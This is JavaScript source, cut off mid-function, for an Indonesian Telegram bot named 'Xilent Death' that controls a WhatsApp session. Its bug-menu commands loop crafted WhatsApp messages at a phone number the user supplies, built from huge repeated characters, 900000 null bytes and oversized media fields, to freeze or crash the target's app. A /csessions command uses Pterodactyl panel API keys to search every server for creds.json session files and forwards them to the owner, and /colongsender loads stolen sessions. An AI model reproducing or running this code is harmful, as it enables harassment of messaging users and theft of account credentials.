      groupConfig.group_id,
      `🚨 Terdeteksi User Di Private

ID: ${ctx.from.id}
Username: @${ctx.from.username || "none"}
Chat ID: ${chatId}

🕊 Note : Jangan Gunakan Bot Di Private Chat`
    );

    return;
  }
  
  const menuMessage = `
<b>「 𝕏 」I'am Xilent Death ⋆｡°✧</b>
<blockquote><b>( 🕊 ) Wellcome, ${username}</b></blockquote>
─ Selamat Datang Di Bot Xilent Death, Gunakan Bot Ini Dengan Bijak
<b>─────────────────────</b>
<blockquote><b>「 ＩＮＦＯＲＭＡＴＩＯＮ 」</b></blockquote>
○ Owner   : @gaponback
○ Version  : 4.0
○ System  : Auto Update
○ Sender  : ${senderStatus}
𖤐 Your Id : ${idLu}
╰┈➤ Premium : ${premiumStatus} 
<blockquote><b>💐 / I Love U Guys Always</b></blockquote>`; 

  const keyboard = [
  [
    { text: "ꨄ Bug Menu", callback_data: "/bug", style: "success" },
    { text: "🜲 Owner Menu", callback_data: "/controls", style: "danger" }
  ],
  [
    { text: "Information Script", url: "https://t.me/xilentdeathinfo", style: "primary", icon_custom_emoji_id: "5231122114710348213" }
  ]
];

  const mp3Url = "https://files.catbox.moe/uuewio.mp3";

  try {
    await ctx.replyWithPhoto(StartUrl, {
      caption: menuMessage,
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.replyWithAudio({ url: mp3Url }, {
      title: "Xilent Death 4.0",
      performer: "Xilent Death 4.0"
    });
  } catch (err) {
    console.error("Error sending menu:", err);
  }
});

bot.action('/start', async (ctx) => {
    if (!tokenValidated) {
        try { 
            await ctx.answerCbQuery(); 
        } catch (e) {}
        return ctx.reply("🔑 ☇ Masukkan token anda untuk diaktifkan, Format: /start ");
    }

    try {
        // -------------------------------
        const senderStatus = isWhatsAppConnected ? "Terisi Penuh" : "Kosong";
        const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
        const runtimeStatus = formatRuntime();
        const memoryStatus = formatMemory();
        const cooldownStatus = loadCooldown();
        const username = ctx.from?.username ? `@${ctx.from.username}` : "Tidak ada username";

        const menuMessage = `
<blockquote><b>「 𝑋𝑖𝑙𝑒𝑛𝑡 - 𝐷𝑒𝑎𝑡ℎ 」⋆｡°✧</b></blockquote>
─ Selamat Datang Di Bot Xilent Death, Gunakan Bot Ini Dengan Bijak
<blockquote><b>⋉/- Information Xilent Death -/⋊</b></blockquote>
○ Owner   : @gaponback
○ Version  : 4.0
○ System  : Auto Update
○ Sender  : ${senderStatus}
<blockquote><b>✧ / - Thanks To - / ✧</b></blockquote>
 • Allah [My God]
 • Manx [Member Jmk 48]
 • Vixz [Abnormal]
 • Otax [Kikir]
 • Nando [Super Kikir]`;

 const keyboard = [
  [
    { text: "ꨄ Bug Menu", callback_data: "/bug", style: "success" },
    { text: "🜲 Owner Menu", callback_data: "/controls", style: "danger" }
  ],
  [
    { text: "Information Script", url: "https://t.me/xilentdeathinfo", style: "primary", icon_custom_emoji_id: "5231122114710348213" }
  ]
];

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: StartUrl,
        caption: menuMessage,
        parse_mode: "HTML"
      },
      {
        reply_markup: { inline_keyboard: keyboard }
      }
    );
  } catch (err) {
    console.error(err);
    await ctx.reply("❌ Anjay Error.");
  }
});

bot.action("cek_join", async (ctx) => {

  const joined = await checkJoin(ctx);

  if (!joined) {
    return ctx.answerCbQuery(
      "❌ Kamu belum join semua channel",
      {
        show_alert: true
      }
    );
  }

  await ctx.deleteMessage();

  await ctx.answerCbQuery(
    "✅ Join berhasil terdeteksi"
  );

  return ctx.telegram.sendMessage(
    ctx.chat.id,
    "🚀 Sekarang ketik /start"
  );

});

bot.action('/bug', checkGroup, async (ctx) => {  
  const groupList = loadGroup();
  const chatId = String(ctx.chat.id);

  if (!groupList.includes(chatId)) {

    if (!isPremiumUser(ctx.from.id)) {
      return ctx.reply(
        "❌ Akses dikunci\nGroup belum aktif / bukan premium"
      );
    }

  }
  
    const username = ctx.from?.username ? `@${ctx.from.username}` : "Tidak ada username";
    const senderStatus = isWhatsAppConnected ? "Terisi Penuh" : "Kosong";
    const bugMenu = `<blockquote><b>「 𝑋𝑖𝑙𝑒𝑛𝑡 - 𝐷𝑒𝑎𝑡ℎ 」⋆｡°✧</b></blockquote>
<b>( 🕷 ) Wellcome To Page Bug</b>
<blockquote>𝐀𝐧𝐝𝐨𝐫𝐢𝐝 𝐂𝐨𝐦𝐦𝐚𝐧𝐝</blockquote>
• /delayx ☇ ✆ 62xx
╰┈➤ Delay X Freeze
• /lolipop ☇ ✆ 62xx
╰┈➤ Freeze X Force
<blockquote>𝐈𝐨𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝</blockquote>
• /atleast ☇ ✆ 62xx
╰┈➤ Frezee Tipis
• /cetas ☇ ✆ 62xx
╰┈➤ Delay Medium
<b>───────────────────</b>
<blockquote><b>◌ Wellcome  /  ${username}
╰┈➤ Status Sender : ${senderStatus}</b></blockquote>`;

    const keyboard = [
  [
    { text: "✦ / - Back Menu", callback_data: "/start", style: "success" }
  ]
];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: toolsUrl,
                caption: bugMenu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/controls', checkGroup, async (ctx) => {
  
  const groupList = loadGroup();
  const chatId = String(ctx.chat.id);

  if (!groupList.includes(chatId)) {

    if (!isPremiumUser(ctx.from.id)) {
      return ctx.reply(
        "❌ Akses dikunci\nGroup belum aktif / bukan premium"
      );
    }

  }
  
    const controlsMenu = `
<blockquote><b>「 𝑋𝑖𝑙𝑒𝑛𝑡 - 𝐷𝑒𝑎𝑡ℎ 」⋆｡°✧</b></blockquote>

<blockquote>𖤐 / - 𝐀𝐜𝐜𝐞𝐬 𝐔𝐬𝐞𝐫</blockquote>
• /addprem ☇ Id 
• /delprem ☇ Id 
• /addadmin ☇ Id
• /deladmin ☇ Id

<blockquote>𖤐 / - 𝐔𝐩𝐝𝐚𝐭𝐞 𝐒𝐲𝐬𝐭𝐞𝐦</blockquote>
• /update ☇ in place
• /autoupdate ☇ on/off
<blockquote><b>───────────────────</b></blockquote>`;

    const keyboard = [
  [
    { text: "✧ / - Owner Two", callback_data: "/ownah", style: "success" }
  ], 
  [
    { text: "✦ / - Back Menu", callback_data: "/start", style: "danger" }
  ]
];

    try { 
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: bugUrl,
                caption: controlsMenu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/ownah', async (ctx) => {
    const bug3Menu = `
<blockquote><b>「 𝑋𝑖𝑙𝑒𝑛𝑡 - 𝐷𝑒𝑎𝑡ℎ 」⋆｡°✧</b></blockquote>

<blockquote>𖤐 / - 𝐋𝐢𝐬𝐭 𝐔𝐬𝐞𝐫 𝐀𝐜𝐜𝐞𝐬</blockquote>
• /listprem ☇ Id
╰┈➤ Add Premium User
• /listadmin ☇ Id
╰┈➤ Del Premium 𝐔𝐬𝐞𝐫

<blockquote>𖤐 / - 𝐆𝐫𝐨𝐮𝐩 𝐀𝐜𝐜𝐞𝐬 & 𝐂𝐝</blockquote>
• /group ☇ In Place
╰┈➤ Add Group Premium
• /onlygroup ☇ Inplace / Id Gb
╰┈➤ Only Grub With Button
• /setcd ☇ Time
╰┈➤ Setting Cooldown`;

    const keyboard = [
  [
    { text: "✧ / - Owner One", callback_data: "/controls", style: "success" }
  ], 
  [
    { text: "✦ / - Back Menu", callback_data: "/start", 
  style: "danger" }
  ]
];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: tqtoUrl,
                caption: bug3Menu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

//------------ CASE TOOLS ---------------//
bot.on('callback_query', async (ctx) => {
    const data = ctx.callbackQuery.data;
  
    console.log(`[CALLBACK] Received: ${data} from user: ${ctx.from.id}`);
    
    if (data.startsWith('addprem_')) {
        console.log('[CALLBACK] Processing addprem button...');
        
        // GANTI INI: dari ownerID ke isAdminUser
        if (!isAdminUser(ctx.from.id)) {
            console.log(`[CALLBACK] User ${ctx.from.id} is not admin`);
            await ctx.answerCbQuery("❌ Akses ditolak", { show_alert: true });
            return;
        }
        
        const parts = data.split('_');
        if (parts.length < 3) {
            console.log('[CALLBACK] Invalid data format');
            await ctx.answerCbQuery("❌ Data tidak valid", { show_alert: true });
            return;
        }
        
        const userId = parts[1];
        const duration = parseInt(parts[2]);
        
        console.log(`[CALLBACK] Adding premium: ${userId} for ${duration} days`);
        
        // Proses add premium
        const expiryDate = addPremiumUser(userId, duration);
        
        // Edit pesan asli untuk hapus tombol
        try {
            await ctx.editMessageText(
                `✅ <b>Premium Berhasil Ditambahkan</b>\n` +
                `• User: <code>${userId}</code>\n` +
                `• Durasi: ${duration} hari\n` +
                `• Berakhir: ${expiryDate}`,
                { 
                    parse_mode: "HTML",
                    reply_markup: { inline_keyboard: [] }
                }
            );
            console.log('[CALLBACK] Message edited successfully');
        } catch (error) {
            console.error('[CALLBACK] Error editing message:', error);
            // Coba kasih feedback ke user
            try {
                await ctx.answerCbQuery("✅ Premium berhasil ditambahkan");
            } catch (e) {}
            return;
        }
        
        await ctx.answerCbQuery("✅ Premium berhasil ditambahkan");
        console.log('[CALLBACK] Callback answered');
        
        // Beri notifikasi ke user
        try {
            await ctx.telegram.sendMessage(
                userId,
                `🎉 <b>Selamat!</b>\n` +
                `Anda sekarang pengguna Premium XILENT DEATH!\n` +
                `• Durasi: ${duration} hari\n` +
                `• Berakhir: ${expiryDate}`,
                { parse_mode: "HTML" }
            );
            console.log(`[CALLBACK] Notification sent to ${userId}`);
        } catch (error) {
            console.log('[CALLBACK] Cannot send notification to user:', error.message);
        }
        
        console.log('[CALLBACK] Process completed');
    }
    
    // CALLBACK TIKTOK MEK
    
    else if (data.startsWith("tiktok_download|")) {
    const parts = data.split("|");
    const type = parts.pop(); // Ambil elemen terakhir (video/hd/audio)
const url = parts.slice(1).join("|"); // Gabungkan kembali sisa bagian URL
    
    // Konfirmasi pemrosesan
    await ctx.answerCbQuery("⏳ Memproses permintaan...");
    
    // Edit pesan untuk menampilkan status
    await ctx.editMessageText(`⏳ Sedang memproses ${getTypeName(type)}...`);
    
    try {
      const result = await downloadTikTok(url, type);
      
      if (result.success) {
        // Kirim file sesuai tipe
        if (type === 'audio') {
          await ctx.replyWithAudio(
            { source: Buffer.from(result.data), filename: 'tiktok_audio.mp3' },
            { title: 'TikTok Audio', performer: 'TikTok Downloader' }
          );
        } else {
          await ctx.replyWithVideo(
            { source: Buffer.from(result.data), filename: `tiktok_${type}.mp4` },
            { 
              supports_streaming: true,
              caption: `✅ Berhasil diunduh\n📁 Tipe: ${getTypeName(type)}`
            }
          );
        }
        
        // Hapus pesan status
        await ctx.deleteMessage();
        
      } else {
        await ctx.editMessageText(`❌ Gagal: ${result.error}`);
      }
      
    } catch (error) {
      await ctx.editMessageText(`❌ Error: ${error.message}`);
    }
  }
  
const query = ctx.callbackQuery;
const cbData = query.data;
const chatId = query.message.chat.id;
const config = loadOnlyGroup();

if (cbData === "onlygroup_on") {
  config.enabled = true;
  config.group_id = chatId;

  saveOnlyGroup(config);

  await ctx.answerCbQuery("✅ Only Group ON");
  await ctx.editMessageText(`⚙️ ONLY GROUP MODE

Status : ON ✅
Group  : ${chatId}`);
}

if (cbData === "onlygroup_off") {
  config.enabled = false;

  saveOnlyGroup(config);

  await ctx.answerCbQuery("❌ Only Group OFF");
  await ctx.editMessageText(`⚙️ ONLY GROUP MODE

Status : OFF ❌
Group  : ${config.group_id || "-"}`);
}

  if (ctx.from.id != ownerID) {
    return ctx.answerCbQuery("❌ Owner only", { show_alert: true });
  }

  if (data === "group_add") {
    addGroup(chatId);

    await ctx.answerCbQuery("✅ Ditambahkan");
    await ctx.editMessageText(`✅ Group masuk:\n${chatId}`);
  }

  if (data === "group_del") {
    delGroup(chatId);

    await ctx.answerCbQuery("❌ Dihapus");
    await ctx.editMessageText(`❌ Group dihapus:\n${chatId}`);
  }
    
});

bot.command("setch", async (ctx) => {

  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ Owner only");
  }

  const username = ctx.message.text.split(" ")[1];

  if (!username) {
    return ctx.reply(
`⚙️ FORMAT

/setch username

Contoh:
/setch gaponback`
    );
  }

  const data = loadChannel();

  const clean = username.replace("@", "");

  if (data.channels.includes(clean)) {
    return ctx.reply("❌ Channel sudah ada");
  }

  data.channels.push(clean);

  saveChannel(data);

  ctx.reply(
`✅ Channel berhasil ditambahkan

📢 https://t.me/${clean}`
  );

});

bot.command("infoup", async (ctx) => {
  const update = await getGaponInfo()

  ctx.reply(
`<pre>${update}</pre>`,
  { parse_mode: "HTML" })
})

const GH_OWNER = "ponzs212";
const GH_REPO = "pullupdate";
const GH_BRANCH = "main";

async function downloadRepo(dir = "", basePath = "/home/container", fileList = []) {
    const url = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;
    
    const { data } = await axios.get(url, {
        headers: {
            "User-Agent": "Mozilla/5.0"
        }
    });

    for (const item of data) {
        const local = path.join(basePath, item.path);

        if (item.type === "file") {
            const fileData = await axios.get(item.download_url, { responseType: "arraybuffer" });
            fs.mkdirSync(path.dirname(local), { recursive: true });
            fs.writeFileSync(local, Buffer.from(fileData.data));

            console.log("[UPDATE FILE]", item.path);
            fileList.push(item.path); // simpan nama file
        }

        if (item.type === "dir") {
            fs.mkdirSync(local, { recursive: true });
            await downloadRepo(item.path, basePath, fileList);
        }
    }

    return fileList;
}

bot.command("update", checkAdmin, async (ctx) => {
    const chat = ctx.chat.id;
    await ctx.reply("🔄 Sedang Mengambil file... mohon tunggu");

    try {
        const files = await downloadRepo("");

        // Ambil beberapa file aja biar ga kepanjangan
        const preview = files.slice(0, 10).map(f => `📄 ${f}`).join("\n");

        await ctx.reply(
`✅ Update berhasil!

📂 Total file: ${files.length}

${preview}${files.length > 10 ? "\n..." : ""}

🍂 Info Update : /infoup
🔁 Restarting bot...`
        );

        setTimeout(() => process.exit(0), 1500);

    } catch (e) {
        await ctx.reply("❌ Gagal update, cek repo GitHub atau koneksi.");
        console.log(e);
    }
});

// spotifyplay
bot.command("spotifyplay", checkPremium, async (ctx) => {
  try {
    const input = ctx.message.text.split(" ").slice(1).join(" ");
    if (!input) {
      return ctx.reply("❌ Masukkan judul lagu atau link Spotify.\n\nContoh:\n/spotifyplay Hadroh Ramadhan Tiba");
    }

    const loading = await ctx.reply("🔍 Mencari lagu...");

    let spotifyUrl;

    if (input.includes("open.spotify.com")) {
      spotifyUrl = input;
    }

    else {
      const search = await axios.get(
        "https://ikyyzyyrestapi.my.id/search/spotify",
        {
          params: { query: input },
          timeout: 60000
        }
      );

      if (!search.data?.status || !search.data?.tracks?.length) {
        await ctx.deleteMessage(loading.message_id).catch(() => {});
        return ctx.reply("❌ Lagu tidak ditemukan.");
      }

      spotifyUrl = search.data.tracks[0].link;
    }

    const dl = await axios.get(
      "https://ikyyzyyrestapi.my.id/download/spotifydl",
      {
        params: {
          apikey: "kyzz",
          url: spotifyUrl
        },
        timeout: 120000
      }
    );

    await ctx.deleteMessage(loading.message_id).catch(() => {});

    if (!dl.data?.status) {
      return ctx.reply("❌ Gagal download lagu.");
    }

    const meta = dl.data.result.metadata;
    const audioUrl = dl.data.result.download;

    await ctx.replyWithPhoto(
      { url: meta.img },
      {
        caption:
`🎵 *${meta.song_name}*

👤 Artist: ${meta.artist}
💿 Album: ${meta.album_name}
⏱ Durasi: ${meta.duration}
📅 Rilis: ${meta.released}`,
        parse_mode: "Markdown"
      }
    );

    await ctx.replyWithAudio(
      { url: audioUrl },
      {
        title: meta.song_name,
        performer: meta.artist
      }
    );

  } catch (err) {
    console.error("Error SpotifyPlay:", err.response?.data || err.message || err);
    ctx.reply("❌ Terjadi kesalahan saat memproses lagu.");
  }
});




bot.command('colongsender', async (ctx) => {
  const msg = ctx.message;
  const chatId = msg.chat.id;
  
  if (!isOwner(msg)) return ctx.reply('❌ Khusus owner we.');

  const doc = msg.reply_to_message?.document;
  if (!doc) return ctx.reply('❌ Balas file session atau creds.json + dengan /colongsender');

  const name = doc.file_name.toLowerCase();
  if (!['.json','.zip','.tar','.tar.gz','.tgz'].some(ext => name.endsWith(ext)))
    return ctx.reply('❌ File bukan session tolol.');

  await ctx.reply('🔄 Proses colong sender in you session…');

  const url = await bot.getFileLink(doc.file_id);
  const { data } = await axios.get(url, { responseType: 'arraybuffer' });
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'));

  if (name.endsWith('.json')) {
    await fs.writeFile(path.join(tmp, 'creds.json'), data);
  } else if (name.endsWith('.zip')) {
    new AdmZip(data).extractAllTo(tmp, true);
  } else {
    const tmpTar = path.join(tmp, name);
    await fs.writeFile(tmpTar, data);
    await tar.x({ file: tmpTar, cwd: tmp });
  }

  const credsPath = await findCredsFile(tmp);
  if (!credsPath) return ctx.reply('❌ creds.json tidak ditemukan bego');

  const creds = await fs.readJson(credsPath);
  const botNumber = creds.me.id.split(':')[0];

  await fs.remove(destDir);
  await fs.copy(tmp, destDir);
  saveActiveSessions(botNumber);

  const auth = await useMultiFileAuthState(destDir);
  await connectToWhatsApp(botNumber, chatId, auth);

  return ctx.reply(`*SUCCES CONNECTING🫀*
  NUMBER : ${botNumber}
  *ANJAYYY KEMALING🗿*`);
});



// Command /cekid
bot.command("cekid", async (ctx) => {
    const chatId = ctx.chat.id;
    
    try {
        // Ambil teks setelah command
        const text = ctx.message.text.split(" ").slice(1).join(" ");
        
        if (!text) {
            return ctx.reply("⚠ Gunakan: /cekid https://whatsapp.com/channel/xxxx");
        }

        if (!text.includes("whatsapp.com/channel/")) {
            return ctx.reply("❌ Link WhatsApp Channel tidak valid!");
        }

        let channelId = text.split("channel/")[1].split(/[/?]/)[0];
        let newsletterJid = channelId + "@newsletter";

        await ctx.reply(
`✅ Newsletter ID ditemukan:

${newsletterJid}`
        );

    } catch (err) {
        console.log(err);
        ctx.reply("Terjadi error saat proses.");
    }
});


bot.command("csessions", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /csessions https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan creds.json di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});

//-------------- COMMAND BUG --------------//

bot.hears(/^(\/)?(atleast|lolipop)(\s|$)/i, checkWhatsAppConnection, checkGroup, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply(`🪧 ☇ Format: /xfuck 62×××`);
  }

  const groupList = loadGroup();
  const chatId = String(ctx.chat.id);

  if (!groupList.includes(chatId)) {

    if (!isPremiumUser(ctx.from.id)) {
      return ctx.reply(
        "❌ Akses dikunci\nGroup belum aktif / bukan premium"
      );
    }

  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const groupConfig = loadOnlyGroup();

  if (
    groupConfig.enabled &&
    String(chatId) !== String(groupConfig.group_id)
  ) {

    await ctx.reply(
      "⚠️ Fitur ini hanya untuk grup utama."
    );

    await bot.telegram.sendMessage(
      groupConfig.group_id,
      `🚨 Ada yang mencoba bug di luar grup

ID: ${ctx.from.id}
Username: @${ctx.from.username || "none"}
Chat ID: ${chatId}`
    );

    return;
  }

  await ctx.telegram.sendPhoto(
    ctx.chat.id,
    attackUrl,
    {
      caption: `<blockquote>「 𝑋𝑖𝑙𝑒𝑛𝑡 - 𝐷𝑒𝑎𝑡ℎ 」⋆｡°✧    
ꨄ ターゲット : ${q}
╰┈➤ Status : Success .･✧:｡
↻    ◁    II    ▷    ↺</blockquote>`,

      parse_mode: "HTML",

      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "⌜📱⌟ CHECK TARGET",
              url: `https://wa.me/${q}`
            }
          ]
        ]
      }

    }
  );

  for (let i = 0; i < 10; i++) {
    await X7Force(target);
    await BlankFreezeChat(sock, target);
    await crasInVisiBle(sock, target);
    await new Promise((r) =>
      setTimeout(r, 200)
    );

  }

});

bot.hears(/^(\/)?(delayx|cetas)(\s|$)/i, checkWhatsAppConnection, checkGroup, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply(`🪧 ☇ Format: /xfuck 62×××`);
  }

  const groupList = loadGroup();
  const chatId = String(ctx.chat.id);

  if (!groupList.includes(chatId)) {

    if (!isPremiumUser(ctx.from.id)) {
      return ctx.reply(
        "❌ Akses dikunci\nGroup belum aktif / bukan premium"
      );
    }

  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const groupConfig = loadOnlyGroup();

  if (
    groupConfig.enabled &&
    String(chatId) !== String(groupConfig.group_id)
  ) {

    await ctx.reply(
      "⚠️ Fitur ini hanya untuk grup utama."
    );

    await bot.telegram.sendMessage(
      groupConfig.group_id,
      `🚨 Ada yang mencoba bug di luar grup

ID: ${ctx.from.id}
Username: @${ctx.from.username || "none"}
Chat ID: ${chatId}`
    );

    return;
  }

  await ctx.telegram.sendPhoto(
    ctx.chat.id,
    attackUrl,
    {
      caption: `<blockquote>「 𝑋𝑖𝑙𝑒𝑛𝑡 - 𝐷𝑒𝑎𝑡ℎ 」⋆｡°✧    
ꨄ ターゲット : ${q}
╰┈➤ Status : Success .･✧:｡
↻    ◁    II    ▷    ↺</blockquote>`,

      parse_mode: "HTML",

      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "⌜📱⌟ CHECK TARGET",
              url: `https://wa.me/${q}`
            }
          ]
        ]
      }

    }
  );

  for (let i = 0; i < 15; i++) {
    await delayHardCuy(sock, target),
    await new Promise((r) =>
      setTimeout(r, 2000)
    );

  }

});

async function BlankFreezeChat(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(5000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"amba","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

async function crasInVisiBle(sock, target) {
  const MakLo = { 
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 999999999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "MakLoo¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
